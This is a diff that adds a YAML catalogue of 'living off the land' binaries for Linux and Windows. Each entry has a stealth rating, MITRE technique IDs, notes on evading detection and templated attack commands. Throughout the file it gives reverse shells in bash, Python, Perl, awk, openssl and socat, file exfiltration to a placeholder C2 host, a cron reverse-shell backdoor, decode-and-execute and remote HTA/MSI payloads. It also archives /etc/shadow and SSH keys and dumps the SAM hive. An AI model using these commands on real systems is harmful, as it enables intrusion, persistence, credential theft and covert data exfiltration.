@@ -1,0 +1,471 @@
+
+lolbins:
+
+  - name: curl
+    platform: cross-platform
+    binary: curl
+    categories: [download, recon, exfiltrate]
+    description: "Universal HTTP/HTTPS client — indistinguishable from legitimate web traffic"
+    stealth_rating: 85
+    mitre_techniques: ["T1105", "T1071.001", "T1041"]
+    detection_notes: "Rarely flagged; one of the most common binaries on any system"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/curl/"
+    example_commands:
+      - task: "download file"
+        command: "curl -s -o {output} {url}"
+        description: "Silent file download"
+      - task: "port check"
+        command: "curl -s -o /dev/null -w '%{http_code}' --connect-timeout 2 http://{target}:{port}"
+        description: "HTTP port probe — looks like normal web request"
+      - task: "header grabbing"
+        command: "curl -s -I -A 'Mozilla/5.0' https://{target}/"
+        description: "Grab HTTP headers with browser User-Agent"
+      - task: "exfiltrate data"
+        command: "curl -s -X POST -d @{file} https://{c2}/upload"
+        description: "POST file contents to external server"
+      - task: "dns over https"
+        command: "curl -s 'https://dns.google/resolve?name={domain}&type=A' | python3 -m json.tool"
+        description: "DNS resolution over HTTPS — bypasses DNS monitoring"
+
+  - name: wget
+    platform: linux
+    binary: wget
+    categories: [download]
+    description: "Non-interactive network downloader"
+    stealth_rating: 80
+    mitre_techniques: ["T1105"]
+    detection_notes: "Common on Linux servers; wget User-Agent is distinctive but rarely blocked"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/wget/"
+    example_commands:
+      - task: "download file"
+        command: "wget -q -O {output} {url}"
+        description: "Quiet file download"
+      - task: "mirror site"
+        command: "wget -q --mirror --no-parent {url}"
+        description: "Mirror website for offline analysis"
+
+  - name: bash_tcp
+    platform: linux
+    binary: bash
+    categories: [recon, execute, exfiltrate]
+    description: "Bash built-in /dev/tcp for networkless probing — zero tool installation"
+    stealth_rating: 95
+    mitre_techniques: ["T1059.004", "T1046", "T1071.001"]
+    detection_notes: "Uses only bash built-ins; no external binary invoked; very hard to detect"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/bash/"
+    example_commands:
+      - task: "port scan"
+        command: "for port in 22 80 443 8080 3306; do (echo '' > /dev/tcp/{target}/$port) 2>/dev/null && echo \"$port open\"; done"
+        description: "TCP port check using bash built-in — no nmap needed"
+      - task: "reverse shell"
+        command: "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+        description: "Bash reverse shell — no netcat needed"
+      - task: "banner grab"
+        command: "exec 3<>/dev/tcp/{target}/{port}; echo -e 'HEAD / HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3; exec 3>&-"
+        description: "HTTP banner grab using bash only"
+      - task: "exfiltrate via tcp"
+        command: "cat {file} > /dev/tcp/{c2}/{port}"
+        description: "Send file over raw TCP"
+
+  - name: python3
+    platform: cross-platform
+    binary: python3
+    categories: [execute, download, recon, exfiltrate, persist]
+    description: "Python interpreter — extremely versatile for any task"
+    stealth_rating: 75
+    mitre_techniques: ["T1059.006", "T1105", "T1046", "T1041"]
+    detection_notes: "Common on dev/admin systems; script contents determine detectability"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/python/"
+    example_commands:
+      - task: "port scan"
+        command: "python3 -c \"import socket; [print(f'{p} open') for p in [22,80,443,8080,3306] if not socket.socket().connect_ex(('{target}',p))]\""
+        description: "Python socket port scanner — no signature"
+      - task: "download file"
+        command: "python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}', '{output}')\""
+        description: "Python HTTP download"
+      - task: "http server"
+        command: "python3 -m http.server {port} --bind 0.0.0.0"
+        description: "Quick HTTP server for file staging"
+      - task: "reverse shell"
+        command: "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""
+        description: "Python reverse shell"
+
+  - name: openssl
+    platform: cross-platform
+    binary: openssl
+    categories: [recon, exfiltrate, execute]
+    description: "TLS/SSL toolkit — stealthy encrypted probing and data transfer"
+    stealth_rating: 90
+    mitre_techniques: ["T1573.002", "T1071.001", "T1046"]
+    detection_notes: "TLS connections are expected; very hard to distinguish from legitimate traffic"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/openssl/"
+    example_commands:
+      - task: "tls probe"
+        command: "openssl s_client -connect {target}:443 -servername {target} </dev/null 2>/dev/null | openssl x509 -text -noout"
+        description: "TLS certificate inspection — looks like normal HTTPS"
+      - task: "encrypted reverse shell"
+        command: "openssl s_client -quiet -connect {ip}:{port} | /bin/sh 2>&1 | openssl s_client -quiet -connect {ip}:{port2}"
+        description: "Encrypted reverse shell via TLS"
+      - task: "encrypted file transfer"
+        command: "openssl s_client -connect {c2}:{port} < {file}"
+        description: "Send file over encrypted channel"
+
+  - name: ssh
+    platform: linux
+    binary: ssh
+    categories: [execute, exfiltrate, persist]
+    description: "SSH client — tunneling, port forwarding, and remote execution"
+    stealth_rating: 88
+    mitre_techniques: ["T1021.004", "T1572", "T1071.004"]
+    detection_notes: "SSH traffic is expected; tunneled traffic is encrypted and opaque to inspection"
+    common_on_servers: true
+    example_commands:
+      - task: "port forward"
+        command: "ssh -L {local_port}:{target}:{remote_port} {jump_host} -N -f"
+        description: "Local port forward via SSH tunnel"
+      - task: "dynamic socks proxy"
+        command: "ssh -D 1080 {jump_host} -N -f"
+        description: "SOCKS proxy for pivoting"
+      - task: "remote command"
+        command: "ssh {user}@{target} '{command}'"
+        description: "Execute command on remote host"
+
+  - name: nc_openbsd
+    platform: linux
+    binary: nc
+    categories: [recon, exfiltrate, execute]
+    description: "Netcat — the network Swiss Army knife"
+    stealth_rating: 65
+    mitre_techniques: ["T1046", "T1105", "T1059"]
+    detection_notes: "Moderately detected; some EDRs flag netcat usage"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/nc/"
+    example_commands:
+      - task: "port scan"
+        command: "nc -zv -w1 {target} 1-1024 2>&1 | grep 'open'"
+        description: "Netcat port scan"
+      - task: "banner grab"
+        command: "echo '' | nc -w2 {target} {port}"
+        description: "Service banner grabbing"
+      - task: "file transfer"
+        command: "nc {target} {port} < {file}"
+        description: "Send file via netcat"
+
+  - name: find
+    platform: linux
+    binary: find
+    categories: [recon, privesc]
+    description: "File system search — discover SUID binaries, writable dirs, sensitive files"
+    stealth_rating: 92
+    mitre_techniques: ["T1083", "T1548.001"]
+    detection_notes: "find is used constantly by system processes; essentially invisible"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/find/"
+    example_commands:
+      - task: "find suid binaries"
+        command: "find / -perm -4000 -type f 2>/dev/null"
+        description: "Discover SUID binaries for privilege escalation"
+      - task: "find writable directories"
+        command: "find / -writable -type d 2>/dev/null"
+        description: "Find world-writable directories"
+      - task: "find sensitive files"
+        command: "find / -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name 'shadow' 2>/dev/null"
+        description: "Discover config files, keys, and credentials"
+      - task: "find recent files"
+        command: "find / -mtime -1 -type f 2>/dev/null"
+        description: "Files modified in the last 24 hours"
+
+  - name: awk
+    platform: linux
+    binary: awk
+    categories: [execute, exfiltrate]
+    description: "Text processing — can execute commands and open network connections"
+    stealth_rating: 90
+    mitre_techniques: ["T1059", "T1041"]
+    detection_notes: "AWK is a standard Unix tool; EDRs rarely monitor it"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/awk/"
+    example_commands:
+      - task: "reverse shell"
+        command: "awk 'BEGIN {s=\"/inet/tcp/0/{ip}/{port}\";while(1){printf \"> \" |& s;if((s |& getline c) <= 0) break;while(c && (c |& getline line) > 0) print line |& s;close(c)}}'"
+        description: "AWK reverse shell — extremely unusual signature"
+      - task: "extract data"
+        command: "awk -F: '{print $1}' /etc/passwd"
+        description: "Extract usernames from passwd file"
+
+  - name: base64
+    platform: cross-platform
+    binary: base64
+    categories: [exfiltrate, execute]
+    description: "Base64 encoding/decoding — payload obfuscation and data encoding"
+    stealth_rating: 88
+    mitre_techniques: ["T1027", "T1132.001"]
+    detection_notes: "Base64 is standard; encoding payloads evades simple string matching"
+    common_on_servers: true
+    example_commands:
+      - task: "encode payload"
+        command: "echo '{payload}' | base64"
+        description: "Base64 encode a payload or command"
+      - task: "decode and execute"
+        command: "echo '{encoded}' | base64 -d | bash"
+        description: "Decode and execute base64-encoded command"
+      - task: "encode file for exfil"
+        command: "base64 {file} | curl -s -X POST -d @- https://{c2}/upload"
+        description: "Encode file and exfiltrate via HTTP POST"
+
+  - name: xxd
+    platform: linux
+    binary: xxd
+    categories: [exfiltrate]
+    description: "Hex dump utility — alternative encoding for data exfiltration"
+    stealth_rating: 85
+    mitre_techniques: ["T1132"]
+    detection_notes: "Standard Linux utility; hex encoding is less commonly monitored than base64"
+    common_on_servers: true
+    example_commands:
+      - task: "hex encode file"
+        command: "xxd -p {file} | tr -d '\\n'"
+        description: "Hex-encode a file for exfiltration"
+      - task: "decode hex"
+        command: "echo '{hex}' | xxd -r -p"
+        description: "Decode hex data back to binary"
+
+  - name: tar
+    platform: linux
+    binary: tar
+    categories: [exfiltrate, execute]
+    description: "Archive utility — compress and stage data for exfiltration"
+    stealth_rating: 88
+    mitre_techniques: ["T1560.001", "T1059"]
+    detection_notes: "Archiving files is normal admin activity"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/tar/"
+    example_commands:
+      - task: "archive for exfil"
+        command: "tar czf /tmp/.data.tar.gz -C / etc/shadow etc/passwd home/*/.ssh 2>/dev/null"
+        description: "Compress sensitive files for exfiltration"
+      - task: "execute via checkpoint"
+        command: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh'"
+        description: "Execute shell via tar checkpoint feature"
+
+  - name: crontab
+    platform: linux
+    binary: crontab
+    categories: [persist]
+    description: "Cron scheduler — establish persistent backdoor access"
+    stealth_rating: 70
+    mitre_techniques: ["T1053.003"]
+    detection_notes: "Cron job modifications may be logged; use existing cron directories when possible"
+    common_on_servers: true
+    example_commands:
+      - task: "establish persistence"
+        command: "(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"') | crontab -"
+        description: "Add reverse shell to cron — executes every 5 minutes"
+      - task: "enumerate scheduled tasks"
+        command: "crontab -l 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; cat /etc/crontab 2>/dev/null"
+        description: "Enumerate all scheduled tasks"
+
+  - name: socat
+    platform: linux
+    binary: socat
+    categories: [recon, execute, exfiltrate]
+    description: "Advanced socket relay — encrypted tunnels, port forwarding"
+    stealth_rating: 72
+    mitre_techniques: ["T1572", "T1059", "T1046"]
+    detection_notes: "Less common than netcat; some EDRs flag it"
+    common_on_servers: false
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/socat/"
+    example_commands:
+      - task: "encrypted reverse shell"
+        command: "socat OPENSSL:{ip}:{port},verify=0 EXEC:/bin/sh"
+        description: "TLS-encrypted reverse shell"
+      - task: "port forward"
+        command: "socat TCP-LISTEN:{local_port},fork TCP:{target}:{remote_port}"
+        description: "TCP port forwarding relay"
+
+  - name: perl
+    platform: linux
+    binary: perl
+    categories: [execute, download, recon]
+    description: "Perl interpreter — versatile scripting for any task"
+    stealth_rating: 73
+    mitre_techniques: ["T1059.006", "T1105"]
+    detection_notes: "Common on older Linux systems; less common on modern minimal installs"
+    common_on_servers: true
+    gtfobins_url: "https://gtfobins.github.io/gtfobins/perl/"
+    example_commands:
+      - task: "reverse shell"
+        command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+        description: "Perl reverse shell"
+      - task: "download file"
+        command: "perl -MHTTP::Tiny -e 'HTTP::Tiny->new->mirror(\"{url}\", \"{output}\")'"
+        description: "Perl HTTP file download"
+
+  - name: certutil
+    platform: windows
+    binary: certutil.exe
+    categories: [download, execute]
+    description: "Certificate utility — commonly abused for file downloads and encoding"
+    stealth_rating: 55
+    mitre_techniques: ["T1105", "T1140"]
+    detection_notes: "Heavily monitored by modern EDRs; consider alternatives"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    example_commands:
+      - task: "download file"
+        command: "certutil -urlcache -split -f {url} {output}"
+        description: "Download file via certutil — classic LOLBAS technique"
+      - task: "base64 decode"
+        command: "certutil -decode {encoded_file} {output}"
+        description: "Decode base64 file"
+
+  - name: bitsadmin
+    platform: windows
+    binary: bitsadmin.exe
+    categories: [download, persist]
+    description: "Background transfer service — stealthy async file downloads"
+    stealth_rating: 65
+    mitre_techniques: ["T1105", "T1197"]
+    detection_notes: "BITS transfers blend with Windows Update traffic"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+    example_commands:
+      - task: "download file"
+        command: "bitsadmin /transfer job /download /priority normal {url} {output}"
+        description: "Background file download via BITS"
+      - task: "persistent download"
+        command: "bitsadmin /create backdoor & bitsadmin /addfile backdoor {url} {output} & bitsadmin /setnotifycmdline backdoor {command} & bitsadmin /resume backdoor"
+        description: "BITS job with notification command for persistence"
+
+  - name: mshta
+    platform: windows
+    binary: mshta.exe
+    categories: [execute]
+    description: "HTML Application host — execute HTA files or inline VBScript/JScript"
+    stealth_rating: 45
+    mitre_techniques: ["T1218.005"]
+    detection_notes: "Well-known LOLBin; most EDRs flag mshta.exe execution"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    example_commands:
+      - task: "execute remote hta"
+        command: "mshta http://{c2}/payload.hta"
+        description: "Execute remote HTA application"
+      - task: "inline vbscript"
+        command: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(iwr {url})\"\", 0:close\")"
+        description: "Inline VBScript execution"
+
+  - name: rundll32
+    platform: windows
+    binary: rundll32.exe
+    categories: [execute]
+    description: "DLL execution host — execute arbitrary DLLs"
+    stealth_rating: 50
+    mitre_techniques: ["T1218.011"]
+    detection_notes: "Commonly monitored; unusual DLL paths are flagged"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+    example_commands:
+      - task: "execute dll"
+        command: "rundll32.exe {dll_path},EntryPoint"
+        description: "Execute a DLL export function"
+      - task: "javascript execution"
+        command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c {command}\")"
+        description: "Execute JavaScript via rundll32"
+
+  - name: wmic
+    platform: windows
+    binary: wmic.exe
+    categories: [recon, execute]
+    description: "WMI command-line — system enumeration and remote execution"
+    stealth_rating: 60
+    mitre_techniques: ["T1047", "T1082", "T1057"]
+    detection_notes: "WMI is heavily used by admins; blend with normal management traffic"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
+    example_commands:
+      - task: "enumerate processes"
+        command: "wmic process list brief"
+        description: "List running processes"
+      - task: "remote execution"
+        command: "wmic /node:{target} process call create \"{command}\""
+        description: "Execute command on remote system via WMI"
+      - task: "system info"
+        command: "wmic os get caption,version,buildnumber /format:list"
+        description: "Get OS version information"
+
+  - name: powershell
+    platform: windows
+    binary: powershell.exe
+    categories: [execute, download, recon, exfiltrate, persist]
+    description: "PowerShell — the most versatile Windows LOLBin"
+    stealth_rating: 40
+    mitre_techniques: ["T1059.001", "T1105", "T1082"]
+    detection_notes: "Heavily logged and monitored; use constrained language mode awareness"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"
+    example_commands:
+      - task: "download file"
+        command: "powershell -ep bypass -c \"(New-Object Net.WebClient).DownloadFile('{url}', '{output}')\""
+        description: "PowerShell file download"
+      - task: "encoded command"
+        command: "powershell -ep bypass -enc {base64_command}"
+        description: "Execute base64-encoded PowerShell command"
+      - task: "port scan"
+        command: "powershell -ep bypass -c \"1..1024 | ForEach-Object { $t = New-Object Net.Sockets.TcpClient; if($t.ConnectAsync('{target}',$_).Wait(100)){$_}; $t.Close() }\""
+        description: "PowerShell TCP port scanner"
+
+  - name: forfiles
+    platform: windows
+    binary: forfiles.exe
+    categories: [execute]
+    description: "File iteration with command execution — proxy execution technique"
+    stealth_rating: 70
+    mitre_techniques: ["T1202"]
+    detection_notes: "Less commonly monitored than cmd.exe or powershell.exe"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/"
+    example_commands:
+      - task: "proxy execute"
+        command: "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{command}\""
+        description: "Execute command via forfiles — indirect execution"
+
+  - name: msiexec
+    platform: windows
+    binary: msiexec.exe
+    categories: [execute, download]
+    description: "Windows Installer — execute MSI packages from remote URLs"
+    stealth_rating: 55
+    mitre_techniques: ["T1218.007"]
+    detection_notes: "MSI installation is common; remote MSI execution is more suspicious"
+    common_on_servers: true
+    lolbas_url: "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
+    example_commands:
+      - task: "execute remote msi"
+        command: "msiexec /q /i http://{c2}/payload.msi"
+        description: "Silent install MSI from remote URL"
+
+  - name: reg
+    platform: windows
+    binary: reg.exe
+    categories: [recon, persist]
+    description: "Registry editor — enumerate config, establish persistence"
+    stealth_rating: 72
+    mitre_techniques: ["T1012", "T1547.001"]
+    detection_notes: "Registry queries are normal admin activity; writes to Run keys are monitored"
+    common_on_servers: true
+    example_commands:
+      - task: "enumerate run keys"
+        command: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+        description: "List auto-run programs"
+      - task: "add persistence"
+        command: "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"{command}\" /f"
+        description: "Add registry run key for persistence"
+      - task: "dump sam hashes"
+        command: "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv"
+        description: "Save SAM and SYSTEM hives for offline hash extraction"
